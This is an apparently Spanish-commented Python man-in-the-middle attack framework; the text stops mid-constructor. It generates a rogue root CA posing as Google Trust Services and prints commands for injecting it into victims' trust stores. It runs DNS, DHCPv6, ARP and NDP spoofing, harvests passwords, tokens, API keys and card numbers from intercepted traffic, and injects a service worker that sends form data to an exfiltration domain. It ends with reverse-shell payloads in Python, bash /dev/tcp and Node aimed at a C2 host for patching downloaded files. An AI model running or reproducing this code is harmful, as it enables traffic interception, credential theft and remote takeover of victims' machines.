#!/usr/bin/env python3

import subprocess
import threading
import time
import sys
import os
import re
import json
import socket
import signal
import logging
import hashlib
import tempfile
import shutil
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple

from scapy.all import (
    ARP, Ether, sendp, srp, get_if_hwaddr, conf, sniff, IP, UDP,
    IPv6, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr,
    DHCP6_Solicit, DHCP6_Advertise, DHCP6_Request, DHCP6_Reply, DHCP6_Reconf,
    DHCP6OptDNSServers, DHCP6OptServerID, DHCP6OptClientID,
    DHCP6OptIA_NA, DHCP6OptElapsedTime, DHCP6_RapidCommit, DHCP6OptDNSDomains,
    DNS, DNSQR, DNSRR,
    Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11AssoReq, Dot11AssoResp,
    Dot11ProbeReq, Dot11ProbeResp, Dot11Deauth, RadioTap, Dot11FCS
)
conf.verb = 0

from mitmproxy import http, ctx, options, tls, connection
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.tools.web import WebMaster
import asyncio

# Intentar importar criptografia nativa para la generacion de la CA falsa
try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

class LogEngine: #  logging centralizado

    def __init__(self, name: str = "MITM_FW"):
        self.logger = logging.getLogger(name)
        if self.logger.hasHandlers():
            self.logger.handlers.clear()

        self.logger.setLevel(logging.DEBUG)

        formatter = logging.Formatter(
            '%(asctime)s.%(msecs)03d [%(levelname)-8s] %(message)s',
            datefmt='%H:%M:%S'
        )

        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)

        self.log_dir = Path("/tmp/mitm_operation")
        self.log_dir.mkdir(parents=True, exist_ok=True)

        fh = logging.FileHandler(self.log_dir / f"operation_{datetime.now():%Y%m%d_%H%M%S}.log")
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)

    def info(self, msg):
        self.logger.info(msg)

    def warning(self, msg):
        self.logger.warning(msg)

    def error(self, msg):
        self.logger.error(msg)

    def debug(self, msg):
        self.logger.debug(msg)

    def critical(self, msg):
        self.logger.critical(msg)

    def alert(self, msg):
        self.logger.critical(f"[!!! ALERT !!!] {msg}")

log = LogEngine()

def is_ipv6(ip: str) -> bool:
    return ':' in ip

class CertificateAuthorityManager: # ROGUE CA

    def __init__(self, ca_dir: Path):
        self.ca_dir = ca_dir
        self.ca_dir.mkdir(parents=True, exist_ok=True)
        self.ca_key_path = self.ca_dir / "rogue_ca.key"
        self.ca_cert_path = self.ca_dir / "rogue_ca.pem"
        self.ca_generated = False

    def generate_rogue_ca(self, key_size: int = 4096) -> bool:
        if not CRYPTO_AVAILABLE:
            log.error("Libreria 'cryptography' no disponible. No se puede generar la CA falsa.")
            log.error("Ejecuta: pip install cryptography")
            return False

        if self.ca_key_path.exists() and self.ca_cert_path.exists():
            log.info("Rogue CA ya existe. Reutilizando certificados en disco.")
            self.ca_generated = True
            self._print_injection_instructions()
            return True

        try:
            log.warning(f"Generando nueva clave RSA-{key_size} para la Rogue CA ...")
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=key_size,
            )

            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "Mountain View"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Google Trust Services LLC"),
                x509.NameAttribute(NameOID.COMMON_NAME, "Global Sign Root CA"),
            ])

            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.utcnow()
            ).not_valid_after(
                datetime.utcnow() + timedelta(days=3650)
            ).add_extension(
                x509.BasicConstraints(ca=True, path_length=None), critical=True,
            ).add_extension(
                x509.SubjectKeyIdentifier.from_public_key(private_key.public_key()), critical=False,
            ).sign(private_key, hashes.SHA256())

            with open(self.ca_key_path, "wb") as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))

            with open(self.ca_cert_path, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))

            self.ca_generated = True
            log.alert("Rogue CA generada exitosamente.")
            log.warning(f"Clave privada: {self.ca_key_path}")
            log.warning(f"Certificado publico: {self.ca_cert_path}")

            self._print_injection_instructions()
            return True

        except Exception as e:
            log.error(f"Fallo critico al generar la Rogue CA: {e}")
            return False

    def _print_injection_instructions(self):
        cert_path_str = str(self.ca_cert_path.absolute())
        print("\n" + "="*70)
        print("  INSTRUCCIONES DE INYECCION DE CERTIFICADO RAIZ (POST-EXPLOIT)")
        print("="*70)
        print(f"  Archivo a inyectar: {cert_path_str}")
        print("-" * 70)
        print("  [ WINDOWS ] (Ejecutar como Administrador en CMD):")
        print(f"    certutil -addstore -f \"Root\" \"{cert_path_str}\"")
        print("-" * 70)
        print("  [ LINUX / DEBIAN / UBUNTU ]:")
        print(f"    sudo cp \"{cert_path_str}\" /usr/local/share/ca-certificates/rogue_ca.crt")
        print("    sudo update-ca-certificates")
        print("-" * 70)
        print("  [ macOS ]:")
        print(f"    sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain \"{cert_path_str}\"")
        print("="*70 + "\n")

    def get_cert_path(self) -> Optional[str]:
        if self.ca_generated or self.ca_cert_path.exists():
            return str(self.ca_cert_path)
        return None

class DNSSpoofer: #  DNS SPOOFING / HIJACKING (DUAL STACK A/AAAA)

    def __init__(self, iface: str, target_ip: Optional[str], spoof_map: Dict[str, str]):
        self.iface = iface
        self.target_ip = target_ip
        self.spoof_map = spoof_map
        self.running = False
        self.sniffer_thread: Optional[threading.Thread] = None
        self.burst_count = 5

        self.stats = {
            'hijacked_v4': 0,
            'hijacked_v6': 0,
            'total_queries_seen': 0
        }

    def _build_bpf_filter(self) -> str:
        base_filter = "udp port 53"
        if self.target_ip:
            if is_ipv6(self.target_ip):
                base_filter += f" and ip6 src {self.target_ip}"
            else:
                base_filter += f" and ip src {self.target_ip}"
        return base_filter

    def _resolve_spoof_ip(self, qname: str) -> Optional[str]:
        qname_clean = qname.rstrip('.').lower()
        for domain_rule, fake_ip in self.spoof_map.items():
            domain_rule = domain_rule.lower()
            if domain_rule.startswith('*.'):
                base_domain = domain_rule[2:]
                if qname_clean == base_domain or qname_clean.endswith(f".{base_domain}"):
                    return fake_ip
            elif qname_clean == domain_rule or qname_clean.endswith(f".{domain_rule}"):
                return fake_ip
        return None

    def _process_dns_packet(self, pkt):
        if not self.running: return
        if not pkt.haslayer(DNSQR): return

        self.stats['total_queries_seen'] += 1
        src_ip = dst_ip = None
        sport = None

        if pkt.haslayer(IP) and pkt.haslayer(UDP):
            if self.target_ip and not is_ipv6(self.target_ip) and pkt[IP].src != self.target_ip:
                return
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            sport = pkt[UDP].sport
        elif pkt.haslayer(IPv6) and pkt.haslayer(UDP):
            if self.target_ip and is_ipv6(self.target_ip) and pkt[IPv6].src != self.target_ip:
                return
            src_ip = pkt[IPv6].src
            dst_ip = pkt[IPv6].dst
            sport = pkt[UDP].sport
        else:
            return

        queried_domain = pkt[DNSQR].qname.decode('utf-8', errors='ignore')
        spoofed_ip = self._resolve_spoof_ip(queried_domain)

        if spoofed_ip:
            qtype = pkt[DNSQR].qtype
            rr_type = 'A'
            rdata = spoofed_ip

            if qtype == 28 or is_ipv6(spoofed_ip):
                rr_type = 'AAAA'
                try:
                    socket.inet_pton(socket.AF_INET6, spoofed_ip)
                except socket.error:
                    rr_type = 'A'

            dns_rr = DNSRR(rrname=pkt[DNSQR].qname, rdata=rdata, type=rr_type)
            dns_response_payload = DNS(
                id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1,
                qd=pkt[DNS].qd, an=dns_rr
            )

            if pkt.haslayer(IP):
                network_layer = IP(dst=src_ip, src=dst_ip) / UDP(dport=sport, sport=53)
            else:
                network_layer = IPv6(dst=src_ip, src=dst_ip) / UDP(dport=sport, sport=53)

            final_packet = network_layer / dns_response_payload

            for _ in range(self.burst_count):
                sendp(final_packet, iface=self.iface, verbose=False)
                time.sleep(0.005)

            if rr_type == 'AAAA':
                self.stats['hijacked_v6'] += 1
            else:
                self.stats['hijacked_v4'] += 1

            log.alert(f"[DNS SPOOF] {queried_domain.rstrip('.')} [{rr_type}] -> {spoofed_ip} (Victima: {src_ip})")

    def start(self):
        target_str = self.target_ip if self.target_ip else "TODA LA RED LOCAL"
        log.warning(f"Iniciando DNS Spoofing en {self.iface} (Objetivo: {target_str})")
        for domain, ip in self.spoof_map.items():
            log.warning(f"  - Regla DNS activa: {domain} => {ip}")
        self.running = True
        bpf_filter = self._build_bpf_filter()
        log.debug(f"Filtro BPF DNS activo: {bpf_filter}")

        def sniff_loop():
            log.info("[DNS] Hilo de escucha DNS activo. Esperando consultas...")
            sniff(filter=bpf_filter, prn=self._process_dns_packet, iface=self.iface, store=False)
        self.sniffer_thread = threading.Thread(target=sniff_loop, daemon=True)
        self.sniffer_thread.start()

    def stop(self):
        log.info(f"Deteniendo DNS Spoofing. Estadisticas: {self.stats}")
        self.running = False


class DHCPv6Spoofer: #  DHCPv6 (ROGUE SERVER / DNS HIJACKING)

    def __init__(self, iface: str, attacker_link_local: str, rogue_dns_ipv4: str):
        self.iface = iface
        self.attacker_link_local = attacker_link_local
        self.rogue_dns_ipv4 = rogue_dns_ipv4
        self.running = False
        self.sniffer_thread: Optional[threading.Thread] = None
        self.mac_self = get_if_hwaddr(iface)
        self.victims_assigned = 0

        self.server_duid = b'\x00\x01\x00\x01' + int(time.time()).to_bytes(4, 'big') + bytes.fromhex(self.mac_self.replace(':', ''))
        log.debug(f"DUID del servidor falso generado: {self.server_duid.hex()}")

    def _generate_malicious_reply(self, pkt) -> Optional[Ether]:
        if not pkt.haslayer(DHCP6_Solicit) or not pkt.haslayer(IPv6):
            return None

        client_mac = pkt[Ether].src
        client_ip = pkt[IPv6].src
        client_duid = b""

        if pkt.haslayer(DHCP6OptClientID):
            client_duid = bytes(pkt[DHCP6OptClientID].duid)
        else:
            client_duid = b'\x00\x01\x00\x01' + int(time.time()).to_bytes(4, 'big') + bytes.fromhex(client_mac.replace(':', ''))

        duid_hash = int.from_bytes(client_duid[-6:], 'big') % 0xffffff
        fake_ipv6_prefix = self.attacker_link_local.rsplit(':', 1)[0]
        victim_ip = f"{fake_ipv6_prefix}:{duid_hash:04x}:0001:0002"

        log.warning(f"[DHCPv6] Solicit interceptado de {client_mac} ({client_ip})")
        log.alert(f"[DHCPv6] Inyectando IP falsa: {victim_ip}")
        log.alert(f"[DHCPv6] Forzando DNS falso: {self.rogue_dns_ipv4}")

        try:
            eth_layer = Ether(src=self.mac_self, dst=client_mac)
            ip6_layer = IPv6(src=self.attacker_link_local, dst=client_ip)

            dhcp6_layer = DHCP6_Reply(trid=pkt[DHCP6_Solicit].trid)
            dhcp6_layer /= DHCP6OptServerID(duid=self.server_duid)
            dhcp6_layer /= DHCP6OptClientID(duid=client_duid)
            dhcp6_layer /= DHCP6_RapidCommit()
            dhcp6_layer /= DHCP6OptElapsedTime(elapsedtime=0)

            ia_na = DHCP6OptIA_NA()
            ia_na.iaid = int.from_bytes(client_duid[:4], 'big')
            ia_na.t1 = 3600; ia_na.t2 = 5400
            iaprefix_data = b'\x00\x00\x00\x01\x00\x00\x00\x00' + socket.inet_pton(socket.AF_INET6, victim_ip)
            ia_na.iadata = [iaprefix_data]
            dhcp6_layer /= ia_na

            dhcp6_layer /= DHCP6OptDNSServers(dns=[self.attacker_link_local])
            dhcp6_layer /= DHCP6OptDNSDomains(domains=[b"local.lan", b""])

            self.victims_assigned += 1
            return eth_layer / ip6_layer / dhcp6_layer
        except Exception as e:
            log.error(f"[DHCPv6] Error construyendo paquete malicioso: {e}")
            return None

    def _packet_handler(self, pkt):
        if not self.running: return
        reply_pkt = self._generate_malicious_reply(pkt)
        if reply_pkt:
            for _ in range(3):
                sendp(reply_pkt, iface=self.iface, verbose=False)
                time.sleep(0.02)

    def start(self):
        log.warning(f"Iniciando motor DHCPv6 Rogue en {self.iface}")
        self.running = True
        def sniff_loop():
            sniff(filter="udp and (port 546 or port 547) and ip6", prn=self._packet_handler, iface=self.iface, store=False)
        self.sniffer_thread = threading.Thread(target=sniff_loop, daemon=True)
        self.sniffer_thread.start()

    def stop(self):
        log.info(f"Deteniendo DHCPv6 Rogue. Victimas afectadas: {self.victims_assigned}")
        self.running = False

class ARPSpoofer: #  MOTOR DE ARP SPOOFING (IPv4)
    """Motor de envenenamiento ARP para redireccion de trafico IPv4"""

    def __init__(self, iface: str, gateway: str, target: str, proxy_port: int = 8080):
        self.iface = iface
        self.gateway = gateway
        self.target = target
        self.proxy_port = proxy_port
        self.running = False
        self.mac_target: Optional[str] = None
        self.mac_gateway: Optional[str] = None
        self.mac_self = get_if_hwaddr(iface)
        self._spoof_thread: Optional[threading.Thread] = None
        self._packets_sent = 0
        self.ip_version = 4

    def resolve_mac(self, ip: str) -> Optional[str]:
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            resp, _ = srp(pkt, iface=self.iface, timeout=3)
            return resp[0][1].hwsrc if resp else None
        except Exception as e:
            log.error(f"Error resolviendo MAC para {ip}: {e}")
            return None

    def _configure_iptables(self) -> bool:
        try:
            log.info("Habilitando IP Forwarding para IPv4...")
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True, capture_output=True)
            log.info("Limpiando reglas NAT existentes...")
            subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
            log.info(f"Aplicando redireccion de puertos hacia {self.proxy_port}...")
            for port in [80, 443, 8080, 8443]:
                subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.iface, "-p", "tcp", "--dport", str(port), "-j", "REDIRECT", "--to-port", str(self.proxy_port)], capture_output=True, check=True)
            return True
        except subprocess.CalledProcessError as e:
            log.error(f"Fallo critico al configurar iptables: {e.stderr.decode().strip()}")
            return False

    def _restore_iptables(self):
        log.info("Restaurando iptables y deshabilitando forwarding...")
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)

    def _spoof_loop(self):
        pkt_to_target = Ether(dst=self.mac_target) / ARP(op=2, psrc=self.gateway, hwsrc=self.mac_self, pdst=self.target, hwdst=self.mac_target)
        pkt_to_gateway = Ether(dst=self.mac_gateway) / ARP(op=2, psrc=self.target, hwsrc=self.mac_self, pdst=self.gateway, hwdst=self.mac_gateway)
        log.warning(f"ARP Spoofing activo: {self.target} <-> {self.gateway}")
        while self.running:
            sendp(pkt_to_target, iface=self.iface, verbose=False)
            sendp(pkt_to_gateway, iface=self.iface, verbose=False)
            self._packets_sent += 2
            time.sleep(2)

    def start(self) -> bool:
        log.info("Fase 1: Resolucion de direcciones MAC via ARP...")
        self.mac_target = self.resolve_mac(self.target)
        self.mac_gateway = self.resolve_mac(self.gateway)
        if not self.mac_target or not self.mac_gateway:
            log.error("No se pudieron resolver las direcciones MAC. Abortando ARP Spoofing.")
            return False
        log.info(f"Target MAC : {self.mac_target}")
        log.info(f"Gateway MAC: {self.mac_gateway}")
        log.info("Fase 2: Configuracion de reglas de redireccion (iptables)...")
        if not self._configure_iptables(): return False
        log.info("Fase 3: Iniciando bucle de envenenamiento...")
        self.running = True
        self._spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._spoof_thread.start()
        return True

    def stop(self):
        log.info("Deteniendo ARP Spoofing. Restaurando tablas ARP...")
        self.running = False
        if self._spoof_thread: self._spoof_thread.join(timeout=5)
        if self.mac_target and self.mac_gateway:
            try:
                restore_target = Ether(dst=self.mac_target) / ARP(op=2, psrc=self.gateway, hwsrc=self.mac_gateway, pdst=self.target, hwdst=self.mac_target)
                restore_gateway = Ether(dst=self.mac_gateway) / ARP(op=2, psrc=self.target, hwsrc=self.mac_target, pdst=self.gateway, hwdst=self.mac_gateway)
                for _ in range(5):
                    sendp(restore_target, iface=self.iface, verbose=False)
                    sendp(restore_gateway, iface=self.iface, verbose=False)
                    time.sleep(0.05)
            except Exception: pass
        self._restore_iptables()
        log.info(f"ARP Spoofing detenido. Total paquetes inyectados: {self._packets_sent}")

class NDPSpoofer: #  NDP SPOOFING (IPv6)

    def __init__(self, iface: str, router_ip: str, target_ip: str, proxy_port: int = 8080):
        self.iface = iface
        self.router_ip = router_ip
        self.target_ip = target_ip
        self.proxy_port = proxy_port
        self.running = False
        self.mac_target: Optional[str] = None
        self.mac_router: Optional[str] = None
        self.mac_self = get_if_hwaddr(iface)
        self._spoof_thread: Optional[threading.Thread] = None
        self._packets_sent = 0
        self.ip_version = 6

    def resolve_mac(self, ip: str) -> Optional[str]:
        try:
            tgt_clean = ip.split("%")[0] if "%" in ip else ip
            mcast_suffix = tgt_clean[-3:].replace(":", "")
            mcast_addr = f"ff02::1:ff{mcast_suffix}"
            ns_pkt = Ether(dst="33:33:00:00:00:01") / IPv6(dst=mcast_addr) / ICMPv6ND_NS(tgt=tgt_clean)
            resp, _ = srp(ns_pkt, iface=self.iface, timeout=3, filter="icmp6 and ip6[40] == 136")
            return resp[0][1].hwsrc if resp else None
        except Exception as e:
            log.error(f"Error resolviendo MAC IPv6 para {ip}: {e}")
            return None

    def _configure_ip6tables(self) -> bool:
        try:
            log.info("Habilitando IP Forwarding para IPv6...")
            subprocess.run(["sysctl", "-w", "net.ipv6.conf.all.forwarding=1"], check=True, capture_output=True)
            subprocess.run(["ip6tables", "-t", "nat", "-F"], capture_output=True)
            log.info(f"Aplicando redireccion ip6tables hacia {self.proxy_port}...")
            for port in [80, 443, 8080, 8443]:
                subprocess.run(["ip6tables", "-t", "nat", "-A", "PREROUTING", "-i", self.iface, "-p", "tcp", "--dport", str(port), "-j", "REDIRECT", "--to-port", str(self.proxy_port)], capture_output=True, check=True)
            return True
        except subprocess.CalledProcessError as e:
            log.error(f"Fallo critico al configurar ip6tables: {e.stderr.decode().strip()}")
            return False

    def _restore_ip6tables(self):
        subprocess.run(["ip6tables", "-t", "nat", "-F"], capture_output=True)
        subprocess.run(["sysctl", "-w", "net.ipv6.conf.all.forwarding=0"], capture_output=True)

    def _spoof_loop(self):
        pkt_to_target = Ether(dst=self.mac_target) / IPv6(dst=self.target_ip) / ICMPv6ND_NA(R=0, S=1, O=1, tgt=self.router_ip) / ICMPv6NDOptDstLLAddr(lladdr=self.mac_self)
        pkt_to_router = Ether(dst=self.mac_router) / IPv6(dst=self.router_ip) / ICMPv6ND_NA(R=0, S=1, O=1, tgt=self.target_ip) / ICMPv6NDOptDstLLAddr(lladdr=self.mac_self)
        log.warning(f"NDP Spoofing activo: {self.target_ip} <-> {self.router_ip}")
        while self.running:
            sendp(pkt_to_target, iface=self.iface, verbose=False)
            sendp(pkt_to_router, iface=self.iface, verbose=False)
            self._packets_sent += 2
            time.sleep(2)

    def start(self) -> bool:
        log.info("Fase 1: Resolucion de MACs via NDP...")
        self.mac_target = self.resolve_mac(self.target_ip)
        self.mac_router = self.resolve_mac(self.router_ip)
        if not self.mac_target or not self.mac_router:
            log.error("No se pudieron resolver las MACs IPv6. Abortando NDP Spoofing.")
            return False
        log.info("Fase 2: Configuracion de ip6tables...")
        if not self._configure_ip6tables(): return False
        log.info("Fase 3: Iniciando bucle NDP...")
        self.running = True
        self._spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._spoof_thread.start()
        return True

    def stop(self):
        log.info("Deteniendo NDP Spoofing. Restaurando tablas de vecinos...")
        self.running = False
        if self._spoof_thread: self._spoof_thread.join(timeout=5)
        if self.mac_target and self.mac_router:
            try:
                restore_t = Ether(dst=self.mac_target) / IPv6(dst=self.target_ip) / ICMPv6ND_NA(R=0, S=1, O=1, tgt=self.router_ip) / ICMPv6NDOptDstLLAddr(lladdr=self.mac_router)
                restore_r = Ether(dst=self.mac_router) / IPv6(dst=self.router_ip) / ICMPv6ND_NA(R=0, S=1, O=1, tgt=self.target_ip) / ICMPv6NDOptDstLLAddr(lladdr=self.mac_target)
                for _ in range(5):
                    sendp(restore_t, iface=self.iface, verbose=False)
                    sendp(restore_r, iface=self.iface, verbose=False)
                    time.sleep(0.05)
            except Exception: pass
        self._restore_ip6tables()
        log.info(f"NDP Spoofing detenido. Total paquetes inyectados: {self._packets_sent}")


class CredentialExtractor: # extractor

    SENSITIVE_HEADERS = {
        'authorization', 'cookie', 'x-api-key', 'x-auth-token',
        'set-cookie', 'proxy-authorization', 'x-forwarded-for'
    }

    PATTERNS = {
        'PASSWORD': re.compile(r'(?:password|passwd|pwd|pass)["\']?\s*[:=]\s*["\']?([^\s"\'&<>]{4,})', re.I),
        'EMAIL': re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'),
        'API_KEY_GENERIC': re.compile(r'(?:api[_-]?key|apikey|secret)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{16,})', re.I),
        'JWT_TOKEN': re.compile(r'(?:bearer|token|auth[_-]?token)["\']?\s*[:=]\s*["\']?(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', re.I),
        'AWS_ACCESS_KEY': re.compile(r'(?:AKIA|ASIA)[A-Z0-9]{16}'),
        'AWS_SECRET_KEY': re.compile(r'(?:AWS|aws)[_\\-]?Secret[_\\-]?Access[_\\-]?Key["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+=]{40})', re.I),
        'STRIPE_API_KEY': re.compile(r'(?:sk|pk)_(?:test|live)_[A-Za-z0-9]{24,}'),
        'SLACK_TOKEN': re.compile(r'xox[baprs]-[A-Za-z0-9-]{10,}'),
        'GITHUB_TOKEN': re.compile(r'(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}'),
        'DISCORD_TOKEN': re.compile(r'[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}'),
        'CREDIT_CARD': re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b'),
        'PRIVATE_KEY': re.compile(r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----'),
        'IPV6_ADDR': re.compile(r'(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:'),
    }

    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.findings: List[Dict[str, Any]] = []
        self._lock = threading.Lock()

    def extract_from_data(self, data: str, source_tag: str, url: str = "") -> int:
        count = 0
        for p_type, pattern in self.PATTERNS.items():
            if p_type == 'IPV6_ADDR': continue

            matches = pattern.findall(data)
            if matches:
                for val in matches:
                    finding = {
                        'timestamp': datetime.now().isoformat(),
                        'type': p_type,
                        'source': source_tag,
                        'url': url[:150],
                        'value': str(val)[:100]
                    }
                    with self._lock:
                        self.findings.append(finding)
                    log.alert(f"[EXTRACT] {p_type} en {source_tag}: {str(val)[:60]}...")
                    count += 1
        return count

    def check_headers(self, headers: Dict[str, str], url: str = ""):
        for header_name, header_value in headers.items():
            if header_name.lower() in self.SENSITIVE_HEADERS:
                log.warning(f"[HEADER] Sensible detectado [{header_name}]: {header_value[:80]}")
                self.extract_from_data(header_value, f"HEADER_{header_name.upper()}", url)

    def get_findings_summary(self) -> Dict[str, int]:
        summary = {}
        for f in self.findings:
            t = f['type']
            summary[t] = summary.get(t, 0) + 1
        return summary

    def dump_to_file(self) -> Path:
        out_file = self.output_dir / f"extracted_data_{datetime.now():%Y%m%d_%H%M%S}.json"
        with open(out_file, 'w') as f:
            json.dump(self.findings, f, indent=2, default=str)
        log.info(f"Datos extraidos guardados en {out_file} ({len(self.findings)} registros)")
        return out_file

class ServiceWorkerInjector: #  MODULO: SERVICE WORKER INJECTION

    SW_PAYLOAD_TEMPLATE = """
const SW_VERSION = 'v7.0.0';
const EXFIL_DOMAIN = '{exfil_domain}';
const EXFIL_INTERVAL = {exfil_interval};

self.addEventListener('install', event => {
    self.skipWaiting();
});

self.addEventListener('activate', event => {
    event.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);

    // Interceptar todas las peticiones y reenviar datos sensibles
    if (event.request.method === 'POST' || event.request.method === 'PUT') {
        event.request.clone().text().then(body => {
            const data = {
                ts: new Date().toISOString(),
                url: event.request.url,
                method: event.request.method,
                headers: Object.fromEntries(event.request.headers.entries()),
                body: body.substring(0, 5000),
                origin: url.origin,
                path: url.pathname
            };
            fetch('https://' + EXFIL_DOMAIN + '/sw-collect', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            }).catch(() => {});
        }).catch(() => {});
    }

    // Cache poisoning: servir versiones modificadas de recursos criticos
    if (url.pathname.endsWith('.js') && url.href.includes('jquery')) {
        event.respondWith(
            fetch(event.request).then(response => {
                return response;
            }).catch(() => caches.match(event.request))
        );
        return;
    }

    event.respondWith(
        fetch(event.request).catch(() => caches.match(event.request))
    );
});

// Sincronizacion periodica de datos almacenados offline
setInterval(() => {
    self.clients.matchAll().then(clients => {
        clients.forEach(client => {
            client.postMessage({type: 'SW_HEARTBEAT', version: SW_VERSION});
        });
    });
}, EXFIL_INTERVAL);
"""

    def __init__(self, exfil_domain: str = "mitm-collector.local", exfil_interval_ms: int = 30000):
        self.exfil_domain = exfil_domain
        self.exfil_interval = exfil_interval_ms
        self.injected_count = 0
        self.sw_payload = self.SW_PAYLOAD_TEMPLATE.format(
            exfil_domain=exfil_domain,
            exfil_interval=exfil_interval_ms
        )
        self.sw_b64 = self._encode_payload()

    def _encode_payload(self) -> str:
        import base64
        return base64.b64encode(self.sw_payload.encode('utf-8')).decode('ascii')

    def inject(self, html_content: str, origin: str) -> str:
        """
        Inyecta el registro del Service Worker en el HTML.
        El SW se sirve desde /mitm-sw.js en el origen de la victima.
        """
        if 'serviceWorker' in html_content.lower():
            # Ya existe un SW, no sobreescribir para evitar deteccion
            return html_content

        sw_reg_script = f"""
<script>
(function(){{
    if('serviceWorker' in navigator){{
        navigator.serviceWorker.register('/mitm-sw.js?v={int(time.time())}')
            .then(function(reg){{ console.log('SW registered:', reg.scope); }})
            .catch(function(err){{ console.log('SW failed:', err); }});
    }}
}})();
</script>
"""
        # Inyectar antes de </head> o </body>
        if '<head>' in html_content.lower():
            regex = re.compile(r'(</head>)', re.I)
            html_content = regex.sub(sw_reg_script + r'\1', html_content, count=1)
        elif '</body>' in html_content.lower():
            html_content = html_content.replace('</body>', sw_reg_script + '</body>')
        else:
            html_content = html_content + sw_reg_script

        self.injected_count += 1
        log.alert(f"[SW INJECT] Service Worker registrado en origen: {origin}")
        return html_content

    def get_sw_response(self) -> Tuple[bytes, Dict[str, str]]:
        """Genera la respuesta HTTP para /mitm-sw.js"""
        body = self.sw_payload.encode('utf-8')
        headers = {
            'Content-Type': 'application/javascript',
            'Cache-Control': 'max-age=86400',
            'Service-Worker-Allowed': '/'
        }
        return body, headers

    def get_stats(self) -> Dict[str, Any]:
        return {'sw_injected': self.injected_count}

class BinaryPatcher: #  SUPPLY CHAIN

    # Firmas magicas de archivos soportados
    MAGIC_SIGNATURES = {
        'PE32': (b'\x4D\x5A', '.exe'),
        'PE64': (b'\x4D\x5A', '.exe'),
        'MSI': (b'\xD0\xCF\x11\xE0', '.msi'),
        'ZIP': (b'\x50\x4B\x03\x04', '.zip'),
        'ELF': (b'\x7F\x45\x4C\x46', ''),
        'DMG': (b'\x78\x01\x73\x0D\x62\x62\x60', '.dmg'),
        'PKG': (b'\x78\x01\x73\x0D\x62\x62\x60', '.pkg'),
        'DEB': (b'\x21\x3C\x61\x72\x63\x68\x3E', '.deb'),
        'RPM': (b'\xED\xAB\xEE\xDB', '.rpm'),
        'APK': (b'\x50\x4B\x03\x04', '.apk'),
        'PYTHON': (b'#', '.py'),
        'SHELL': (b'#', '.sh'),
        'NODE': (b'#', '.js'),
    }

    # Payloads de inyeccion por tipo
    PAYLOADS = {
        '.py': """
# MITM-PERSIST
import threading, subprocess, os, time, socket, json
def _m():
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('{c2_host}',{c2_port}))
            while True:
                d=s.recv(4096).decode()
                if not d: break
                r=subprocess.run(d,shell=True,capture_output=True,text=True)
                s.send((r.stdout+r.stderr).encode())
        except: pass
        time.sleep(30)
threading.Thread(target=_m,daemon=True).start()
""",
        '.sh': """
# MITM-PERSIST
({c2_host}:{c2_port}_connect(){{
while true; do
    bash -i >& /dev/tcp/{c2_host}/{c2_port} 0>&1 2>/dev/null || sleep 30
done
}}) &
""",
        '.js': """
// MITM-PERSIST
const net=require('net');const cp=require('child_process');
const sh=process.platform==='win32'?'cmd.exe':'/bin/sh';
const client=new net.Socket();
client.connect({c2_port},'{c2_host}',()=>{{}});
client.on('data',(d)=>{{cp.exec(d.toString(),(e,out,err)=>{{client.write(out+err);}});}});
client.on('close',()=>{{setTimeout(()=>process.exit(0),30000);}});
""",
    }

    def __init__(self, output_dir: Path, c2_host: str = "10.9.0.1", c2_port: int = 4444):
        self.output_dir = output_dir
